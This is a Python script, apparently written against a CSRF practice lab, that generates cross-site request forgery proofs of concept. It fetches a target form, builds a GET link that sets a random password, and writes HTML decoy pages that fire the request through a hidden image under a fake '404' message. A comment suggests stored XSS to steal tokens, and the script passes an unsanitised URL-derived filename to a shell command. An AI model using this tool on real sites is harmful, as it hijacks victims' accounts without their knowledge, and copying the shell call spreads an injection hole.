import requests
import random
import string
import os
import sys

from bs4 import BeautifulSoup

class CSRF_GENERATE(object):
  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies

  def generate(self):
    options = ["Generate csrf link Poc",
    "Generate csrf html file Poc,[default type is hidden]",
    "Generate csrf domain name html file Poc,[default type is hidden]",
    "useing with javascript","q to quit"]


    while True:
      for num,op in enumerate(options,start=0):
        print("\033[1;32m",num,"\033[0m",op)

      self.op()

  def op(self):
    choice = input("\033[1;32minput you choice:\033[0m")
    if choice.isdigit():
      if int(choice) == 0:
        self.low_base()
        self.encode_base()
      elif int(choice) == 1:
        self.hidden_base()
      elif int(choice) == 2:
        self.bypass_base()
      elif int(choice) == 3:
        self.useing_with_javascript_base()
      else:
        print("\033[1;31mwrong number\033[0m")
    else:
      sys.exit("\033[1;32mquit\033[0m")

  def low_base(self):
    rep = requests.get(self.url,cookies=self.cookies)
    soup = BeautifulSoup(rep.text,"html5lib")
    method = soup.form['method']
    form = soup.form("input")
    if method.lower() == 'get':
      print("\033[1;31mLink Generate\033[0m")
      url = self.url + "?"
      password = ''.join(random.sample(string.ascii_letters+string.digits,5))
      for each in form:
        if each['type'] == 'password':
          url = url + each['name'] + "=" + password + "&"
        elif each['type'].lower() == "submit":
          url = url + each['name'] + "=" + each['value']
      print(url)

    return url

  def encode_base(self):
    print("\033[1;31myou can encode the link with online website\033[0m")

  def hidden_base(self):

    img_tag = "<img src="+self.low_base()+" border='0' style='display:none;'/>" \
        "<h1>404</h1>"\
        "<h2>file not found.<h2>"
    filename = ''.join(random.sample(string.digits+string.ascii_letters,8))+".html"

    with open(filename,"w") as f:
      f.write(img_tag)
      f.close()

    print("\033[1;31mFile Generate\033[0m")
    fileinfo = os.popen("ls -l "+filename)
    print("\033[1;33m",fileinfo.readline(),"\033[0m")


  def bypass_base(self):

    img_tag = "<img src="+self.low_base()+" border='0' style='display:none;'/>" \
        "<h1>404</h1>" \
        "<h2>file not found.<h2>"

    filename = self.url.split("http://")[1].split("/")[0]+".html"
    with open(filename,"w") as f:
      f.write(img_tag)
      f.close()

    print("\033[1;31mFile Generate\033[0m")
    fileinfo = os.popen("ls -l "+filename)
    print("\033[1;33m",fileinfo.readline(),"\033[0m")


  def useing_with_javascript_base(self):
    print("\033[1;31mcomming soon\033[0m")
    print("\033[1;31mcan use store xss get the token to exploit the csrf high level\033[0m")

